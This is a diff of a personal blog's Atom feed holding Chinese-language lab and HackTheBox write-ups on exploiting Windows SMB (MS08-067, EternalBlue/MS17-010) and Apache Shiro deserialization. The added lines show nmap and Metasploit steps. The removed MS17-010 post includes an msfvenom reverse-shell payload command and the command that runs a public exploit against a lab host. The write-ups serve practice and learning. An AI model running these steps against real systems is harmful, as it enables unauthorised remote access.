@@ -1,4 +1,59 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-08-23T20:31:14+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Yueyejian’s Blog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>yueyejian</name></author><entry><title type="html">HackTheBox - Active</title><link href="http://localhost:4000/hack-the-box/active/" rel="alternate" type="text/html" title="HackTheBox - Active" /><published>2023-08-23T00:00:00+08:00</published><updated>2023-08-23T00:00:00+08:00</updated><id>http://localhost:4000/hack-the-box/active</id><content type="html" xml:base="http://localhost:4000/hack-the-box/active/"><![CDATA[<h1 id="hackthebox---active">HackTheBox - Active</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-09-12T17:27:04+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Yueyejian’s Blog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>yueyejian</name></author><entry><title type="html">HackTheBox - Legacy &amp;amp;&amp;amp; Blue</title><link href="http://localhost:4000/hack-the-box/legacy-blue/" rel="alternate" type="text/html" title="HackTheBox - Legacy &amp;amp;&amp;amp; Blue" /><published>2023-09-12T00:00:00+08:00</published><updated>2023-09-12T00:00:00+08:00</updated><id>http://localhost:4000/hack-the-box/legacy-blue</id><content type="html" xml:base="http://localhost:4000/hack-the-box/legacy-blue/"><![CDATA[<h1 id="hackthebox---legacy--blue">HackTheBox - Legacy &amp;&amp; Blue</h1>
+<h2 id="hackthebox---legacy">HackTheBox - Legacy</h2>
+<h3 id="about-legacy">About Legacy</h3>
+<p>Legacy is a fairly straightforward beginner-level machine which demonstrates the potential security risks of SMB on Windows. Only one publicly available exploit is required to obtain administrator access.</p>
+
+<p><img src="/images/hackthebox/legacy/0.png" alt="" /></p>
+
+<h3 id="nmap">Nmap</h3>
+<p><code class="language-plaintext highlighter-rouge"># nmap -n -v -sC -sV --min-rate=1500 10.10.10.4</code></p>
+
+<p><img src="/images/hackthebox/legacy/1.png" alt="" /></p>
+
+<p>再用nmap自带的smb漏扫脚本去扫描，扫描出了<code class="language-plaintext highlighter-rouge">ms17-010</code>以及<code class="language-plaintext highlighter-rouge">ms08-067</code>漏洞                                                          <br />
+<code class="language-plaintext highlighter-rouge"># nmap -n -v --script=smb-vul* --min-rate=1500 10.10.10.4</code></p>
+
+<p><img src="/images/hackthebox/legacy/2.png" alt="" /></p>
+
+<h3 id="msf">MSF</h3>
+<p>MSF启动！
+<img src="/images/hackthebox/legacy/3.png" alt="" /></p>
+
+<p>设置好参数，一键getshell</p>
+
+<p><img src="/images/hackthebox/legacy/4.png" alt="" /></p>
+
+<h2 id="hackthebox---blue">HackTheBox - Blue</h2>
+
+<h3 id="about-blue">About Blue</h3>
+<p>Blue, while possibly the most simple machine on Hack The Box, demonstrates the severity of the EternalBlue exploit, which has been used in multiple large-scale ransomware and crypto-mining attacks since it was leaked publicly.</p>
+
+<p><img src="/images/hackthebox/blue/0.png" alt="" /></p>
+
+<h3 id="nmap-1">Nmap</h3>
+<p><code class="language-plaintext highlighter-rouge"># nmap -n -v -sC -sV --min-rate=1500 10.10.10.40</code></p>
+
+<p><img src="/images/hackthebox/blue/1.png" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge"># nmap -n -v --script=smb-vul*  --min-rate=1500 10.10.10.40</code> 用一样的方法检测出了永恒之蓝漏洞</p>
+
+<p><img src="/images/hackthebox/blue/2.png" alt="" /></p>
+
+<h3 id="msf-1">MSF</h3>
+<p>MSF启动！这次是一只很可爱的小牛                                                            <br />
+<img src="/images/hackthebox/blue/4.png" alt="" /></p>
+
+<p>直接<code class="language-plaintext highlighter-rouge">search ms17-010</code><code class="language-plaintext highlighter-rouge">use 0</code>可以看到这个exp在这些OS版本下可利用，正好我们的靶机是win7</p>
+
+<p><img src="/images/hackthebox/blue/3.png" alt="" /></p>
+
+<h3 id="getshell">GetShell</h3>
+
+<p><img src="/images/hackthebox/blue/5.png" alt="" /></p>
+
+<h3 id="getflag">GetFlag</h3>
+
+<p><img src="/images/hackthebox/blue/6.png" alt="" /></p>]]></content><author><name>yueyejian</name></author><category term="[&quot;hack-the-box&quot;]" /><category term="windows" /><category term="smb" /><category term="msf" /><summary type="html"><![CDATA[HackTheBox - Legacy &amp;&amp; Blue HackTheBox - Legacy About Legacy Legacy is a fairly straightforward beginner-level machine which demonstrates the potential security risks of SMB on Windows. Only one publicly available exploit is required to obtain administrator access.]]></summary></entry><entry><title type="html">HackTheBox - Active</title><link href="http://localhost:4000/hack-the-box/active/" rel="alternate" type="text/html" title="HackTheBox - Active" /><published>2023-08-23T00:00:00+08:00</published><updated>2023-08-23T00:00:00+08:00</updated><id>http://localhost:4000/hack-the-box/active</id><content type="html" xml:base="http://localhost:4000/hack-the-box/active/"><![CDATA[<h1 id="hackthebox---active">HackTheBox - Active</h1>
 <h2 id="about-active">About Active</h2>
 <p>Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.</p>
 
@@ -1886,81 +1941,4 @@ Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储�
 
 <p>可以勾选便捷操作，反弹shell，输入攻击机的ip和端口号，并在攻击机监听端口，可成功获取目标shell</p>
 
-<p><img src="/images/vulhub/CVE-2016-4437/5.jpg" alt="" /></p>]]></content><author><name>yueyejian</name></author><category term="vulhub" /><category term="shiro" /><category term="unserialize" /><category term="web" /><category term="rce" /><summary type="html"><![CDATA[CVE-2016-4437 - Shiro反序列化 0x00 漏洞概述 Apache Shiro是一款开源的java安全框架，执行身份验证、授权、密码和会话管理。 Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为rememberMe的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。]]></summary></entry><entry><title type="html">MS17-010 - 永恒之蓝</title><link href="http://localhost:4000/vul/ms17-010/" rel="alternate" type="text/html" title="MS17-010 - 永恒之蓝" /><published>2022-04-20T00:00:00+08:00</published><updated>2022-04-20T00:00:00+08:00</updated><id>http://localhost:4000/vul/ms17-010</id><content type="html" xml:base="http://localhost:4000/vul/ms17-010/"><![CDATA[<h1 id="ms17-010---永恒之蓝">MS17-010 - 永恒之蓝</h1>
-<h2 id="0x00-漏洞概述">0x00 漏洞概述</h2>
-<p>Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
-
-<h2 id="0x01-影响版本">0x01 影响版本</h2>
-<p>WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0</p>
-
-<h2 id="0x02-环境搭建">0x02 环境搭建</h2>
-<p>靶机winXP（关闭防火墙） 192.168.32.131</p>
-
-<p>攻击机kali   192.168.32.128</p>
-
-<h2 id="0x03-漏洞检测">0x03 漏洞检测</h2>
-<p>通过nmap的扫描可以看到445端口是开着的，永恒之蓝利用的就是445端口的smb服务，操作系统溢出漏洞</p>
-
-<p><img src="/images/vul/ms17-010/0.jpg" alt="" /></p>
-
-<p>打开msf，搜索ms17-010</p>
-
-<p><img src="/images/vul/ms17-010/1.jpg" alt="" /></p>
-
-<p>选中auxiliary/scanner/smb/smb_ms17_010这个模块，扫描C断存在漏洞的主机</p>
-
-<p>用到的命令：</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfconsole
-$ search ms17-101
-$ use 1
-$ show options
-$ set rhost 192.168.32.0/24
-$ run
-</code></pre></div></div>
-<p>结果显示靶机存在漏洞</p>
-
-<p><img src="/images/vul/ms17-010/2.jpg" alt="" /></p>
-
-<h2 id="0x04-漏洞利用">0x04 漏洞利用</h2>
-<p>但是kali自带的永恒之蓝攻击模块是针对64位系统的，而我的靶机如上图所见是32位的。然后我就自闭了，试了msf上面不同的攻击模块和不同的payload，还是获取不到shell，也参考了网上其他大佬的文章，但是看不太懂。。最后去外网搜参考了一位外国友人的文章，碰巧的是他遇到的问题和我的一模一样，于是按照这个方法成功获得了shell。</p>
-
-<p><a href="https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3">Exploiting-ms17-010-without-metasploit-win-xp-sp3</a></p>
-
-<p>首先先下载好下面这个exploit，在这个脚本的描述里，以下windows版本都适用</p>
-
-<p>https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Tested on:
-- Windows 2016 x64
-- Windows 10 Pro Build 10240 x64
-- Windows 2012 R2 x64
-- Windows 8.1 x64
-- Windows 2008 R2 SP1 x64
-- Windows 7 SP1 x64
-- Windows 2008 SP1 x64
-- Windows 2003 R2 SP2 x64
-- Windows XP SP2 x64
-- Windows 8.1 x86
-- Windows 7 SP1 x86
-- Windows 2008 SP1 x86
-- Windows 2003 SP2 x86
-- Windows XP SP3 x86
-- Windows 2000 SP4 x86
-</code></pre></div></div>
-
-<p>然后用msf生成一个用来弹shell的可执行程序</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.32.128 LPORT=2333 -f exe -a x86 --platform windows -o ms17-010.exe
-</code></pre></div></div>
-
-<p>最后还需要一个mysmb.py ，不然会报错</p>
-
-<p>https://github.com/worawit/MS17-010/blob/master/mysmb.py</p>
-
-<p>把这三样东西放在kali中的同一个目录，提前监听2333端口，执行以下命令就可以了</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python send_and_execute.py 192.168.32.131 ms17-010.exe
-
-</code></pre></div></div>
-
-<p><img src="/images/vul/ms17-010/3.jpg" alt="" /></p>]]></content><author><name>yueyejian</name></author><category term="vul" /><category term="windows" /><category term="smb" /><category term="msf" /><category term="rce" /><summary type="html"><![CDATA[MS17-010 - 永恒之蓝 0x00 漏洞概述 Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。]]></summary></entry></feed>
+<p><img src="/images/vulhub/CVE-2016-4437/5.jpg" alt="" /></p>]]></content><author><name>yueyejian</name></author><category term="vulhub" /><category term="shiro" /><category term="unserialize" /><category term="web" /><category term="rce" /><summary type="html"><![CDATA[CVE-2016-4437 - Shiro反序列化 0x00 漏洞概述 Apache Shiro是一款开源的java安全框架，执行身份验证、授权、密码和会话管理。 Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为rememberMe的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。]]></summary></entry></feed>
